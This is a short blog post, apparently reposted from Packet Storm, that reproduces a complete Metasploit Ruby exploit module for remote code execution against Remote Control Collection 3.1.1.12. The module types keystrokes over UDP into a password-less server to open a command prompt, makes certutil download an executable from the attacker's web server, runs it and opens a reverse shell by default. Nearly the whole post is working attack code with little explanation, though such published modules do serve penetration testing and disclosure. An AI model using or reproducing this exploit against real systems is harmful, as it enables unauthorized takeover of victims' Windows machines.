---
layout: post
title: Remote Control Collection
date: 2022-11-29 23:41 +0300
categories: [Exploits, Remote Code Execution (RCE)]
tags: [exploits]
---







![](../../../assets/img/Exploits/remotecontrol.png)

The module written for Metasploit employs the protocol of the Remote Control Server to execute a payload and run it on the server. During the creation of the module, version 3.1.1.12 of the Remote Control Collection by Steppschuh was evaluated and found to be vulnerable.

  

```
SHA-256 | 8ec54480d8b7f9ded99d2b49657f9832dc3a324e3a72069c93377bd06f3766c0
```

```perl
    ##
    # This module requires Metasploit: https://metasploit.com/download
    # Current source: https://github.com/rapid7/metasploit-framework
    ##
    
    class MetasploitModule < Msf::Exploit::Remote
      Rank = NormalRanking
    
      prepend Msf::Exploit::Remote::AutoCheck
      include Exploit::Remote::Udp
      include Exploit::EXE # generate_payload_exe
      include Msf::Exploit::Remote::HttpServer::HTML
      include Msf::Exploit::FileDropper
    
      def initialize(info = {})
        super(
          update_info(
            info,
            'Name' => 'Remote Control Collection RCE',
            'Description' => %q{
              This module utilizes the Remote Control Server's, part
              of the Remote Control Collection by Steppschuh, protocol
              to deploy a payload and run it from the server.  This module will only deploy
              a payload if the server is set without a password (default).
              Tested against 3.1.1.12, current at the time of module writing
            },
            'License' => MSF_LICENSE,
            'Author' => [
              'h00die', # msf module
              'H4rk3nz0' # edb, discovery
            ],
            'References' => [
              [ 'URL', 'http://remote-control-collection.com' ],
              [ 'URL', 'https://github.com/H4rk3nz0/PenTesting/blob/main/Exploits/remote%20control%20collection/remote-control-collection-rce.py' ]
            ],
            'Arch' => [ ARCH_X64, ARCH_X86 ],
            'Platform' => 'win',
            'Stance' => Msf::Exploit::Stance::Aggressive,
            'Targets' => [
              ['default', {}],
            ],
            'DefaultOptions' => {
              'PAYLOAD' => 'windows/shell/reverse_tcp',
              'WfsDelay' => 5,
              'Autocheck' => false
            },
            'DisclosureDate' => '2022-09-20',
            'DefaultTarget' => 0,
            'Notes' => {
              'Stability' => [CRASH_SAFE],
              'Reliability' => [REPEATABLE_SESSION],
              'SideEffects' => [ARTIFACTS_ON_DISK, SCREEN_EFFECTS]
            }
          )
        )
        register_options(
          [
            OptPort.new('RPORT', [true, 'Port Remote Mouse runs on', 1926]),
            OptInt.new('SLEEP', [true, 'How long to sleep between commands', 1]),
            OptString.new('PATH', [true, 'Where to stage payload for pull method', '%temp%\\']),
            OptString.new('CLIENTNAME', [false, 'Name of client, this shows up in the logs', '']),
          ]
        )
      end
    
      def path
        return datastore['PATH'] if datastore['PATH'].end_with? '\\'
    
        "#{datastore['PATH']}\\"
      end
    
      def special_key_header
        "\x7f\x15\x02"
      end
    
      def key_header
        "\x7f\x15\x01"
      end
    
      def windows_key
        udp_sock.put("#{special_key_header}\x01\x00\x00\x00\xab") # key up
        udp_sock.put("#{special_key_header}\x00\x00\x00\x00\xab") # key down
        sleep(datastore['SLEEP'])
      end
    
      def enter_key
        udp_sock.put("#{special_key_header}\x01\x00\x00\x00\x42")
        sleep(datastore['SLEEP'])
      end
    
      def send_command(command)
        command.each_char do |c|
          udp_sock.put("#{key_header}#{c}")
          sleep(datastore['SLEEP'] / 10)
        end
        enter_key
        sleep(datastore['SLEEP'])
      end
    
      def check
        @check_run = true
        @check_success = false
        upload_file
        return Exploit::CheckCode::Vulnerable if @check_success
    
        return Exploit::CheckCode::Safe
      end
    
      def on_request_uri(cli, _req)
        @check_success = true
        if @check_run # send a random file
          p = Rex::Text.rand_text_alphanumeric(rand(8..17))
        else
          p = generate_payload_exe
        end
        send_response(cli, p)
        print_good("Request received, sending #{p.length} bytes")
      end
    
      def upload_file
        connect_udp
        # send a space character to skip any screensaver
        udp_sock.put("#{key_header} ")
        print_status('Connecting and Sending Windows key')
        windows_key
    
        print_status('Opening command prompt')
        send_command('cmd.exe')
    
        filename = Rex::Text.rand_text_alphanumeric(rand(8..17))
        filename << '.exe' unless @check_run
        if @service_started.nil?
          print_status('Starting up our web service...')
          start_service('Path' => '/')
          @service_started = true
        end
        get_file = "certutil.exe -urlcache -f http://#{srvhost_addr}:#{srvport}/ #{path}#{filename}"
        send_command(get_file)
        if @check_run.nil? || @check_run == true
          send_command("del #{path}#{filename} && exit")
        else
          register_file_for_cleanup("#{path}#{filename}")
          print_status('Executing payload')
          send_command("#{path}#{filename} && exit")
        end
        disconnect_udp
      end
    
      def exploit
        @check_run = false
        upload_file
      end
    end
```

<br>

>*Source* :   [https://packetstormsecurity.com](https://packetstormsecurity.com)